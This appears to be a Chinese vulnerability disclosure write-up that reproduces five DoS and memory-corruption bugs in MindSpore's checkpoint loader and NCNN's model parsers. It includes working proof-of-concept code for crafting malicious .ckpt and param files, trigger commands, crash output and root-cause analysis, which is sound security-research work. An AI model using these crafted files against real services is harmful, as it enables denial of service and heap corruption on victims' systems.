## 复现流程（全部实测通过）

### 漏洞 1：MindSpore load_checkpoint DoS（CWE-789）

**环境**：`pip install mindspore`（2.8.0 与 2.10.0 均受影响）

**构造恶意 .ckpt**（32 字节）：
```python
from mindspore.train.checkpoint_pb2 import Checkpoint
msg = Checkpoint()
v = msg.value.add()
v.tag = 'x'
v.tensor.tensor_type = 'Float32'
v.tensor.dims.extend([100000, 100000, 1])   # 1e10 元素 × 4B = 40GB
v.tensor.tensor_content = b'\x00\x00\x80\x3f'  # 仅 4 字节真实数据
open('dos_moderate_own.ckpt','wb').write(msg.SerializeToString())
```

**触发**：
```bash
python -c "from mindspore import load_checkpoint; load_checkpoint('dos_moderate_own.ckpt')"
```

**结果**（实测）：
```
[WARNING] Try to alloca a large memory, size is:40000000000   ← 32B 文件 → 40GB
RuntimeError: Unknown Error!
```
放大率 = 40,000,000,000 / 32 ≈ **12.5 亿倍**。无保护时 OOM 整机。

**根因**：`serialization.py` 把 `tensor.dims` 直接传给 C++ `convert_bytes_to_tensor`，dims 完全不校验与 content 大小匹配。

### 漏洞 2：MindSpore load_checkpoint 堆溢出（CWE-787）⭐

**环境**：同漏洞 1。文件见 [craft_poc.py](../MINDSPORE/上报材料/PoC/craft_poc.py)。

**构造**（279B Float32）：
```bash
python craft_poc.py float32   # dims=[2] 期望8B + content=256B（32倍）
```

**触发**：
```bash
python -c "from mindspore import load_checkpoint; load_checkpoint('poc_heapoverflow.ckpt')"
```

**结果**（实测）：
```
RETURN-NORMALLY          ← 加载"成功"返回！
free(): invalid next size (fast)   ← 进程退出时延迟崩溃 SIGABRT
```

**根因**：`tensor_py.cc CopyFromBuffer` 中 `memcpy_s(dst_ptr, remain_size, src_ptr, remain_size)` 把 **src 剩余长度当 dst 缓冲大小** → 安全函数被绕过 → 堆越界写。`dst_size` 参数从未被读取。

**变体矩阵**（已归档 section 十一/十三）：
- 类型无关：Float32/Float16/Int4/Int8/UInt8/Bool 全部中招
- 负值 dims（dims=[-5]）绕过 `parameter.py` 只查 -1 的校验 → 静默返回畸形 Parameter
- 网络路径：畸形 ckpt 可穿过加载→推理→训练→保存全链路，cb≥25B 时"业务正常 + 退出时延迟崩溃"
- save_checkpoint 对畸形参数静默丢数据（serialization.py:517）

### 漏洞 3：NCNN 负ID越界写（CVE-2026-50144，已修）

**触发**（36B parambin，id=-5）：
```bash
./loadpoc poc_negid.parambin   # 漏洞版：SIGSEGV @ paramdict.cpp:612
                               # master：优雅拒绝 "id=-5"
```
已由腾讯修复（commit 5a0288f2，加 `id < 0` 检查）。仅作对照。

### 漏洞 4：NCNN 96B NULL解引用（CWE-476）⭐

**触发**（96B parambin，len=INT32_MIN）：
```bash
./loadpoc poc96.parambin   # master：Segmentation fault
```
ASAN：`allocation-size-too-big 0xfffffffe00000044` @ paramdict.cpp:591。

**根因**：bin 数组分支 `len` 未校验 → `Mat::create(INT32_MIN)` 符号扩展成 ~18EB → 分配失败返回 NULL → `dr.read(NULL)` → SIGSEGV。兄弟文件 modelbin.cpp 有 5 处 `if (v.empty())` 检查，paramdict.cpp 缺失。

### 漏洞 5：NCNN text 层头解析（CWE-787/755/789）⭐ 本次新确认

**触发**（41B param）：
```text
7767517
1 1
ReLU 0 0
-23300=3,1,2,3
-233
```
```bash
./loadpoc_text poc_text_layerheader.param   # master：Aborted (SIGABRT)
```
- gdb：`std::length_error: vector::_M_default_append`
- ASAN（top_count=1e6 变体）：`heap-buffer-overflow @ net.cpp:1464`
- 2e9 变体：~8GB 分配挂起

**根因**：`Net::load_param` 层头 4 字段不校验 token 数，`ReLU 0 0` 只有 3 token → `top_count` 越行读取攻击者值 → `tops.resize(负/巨大)` / `blobs[blob_index]` 越界。
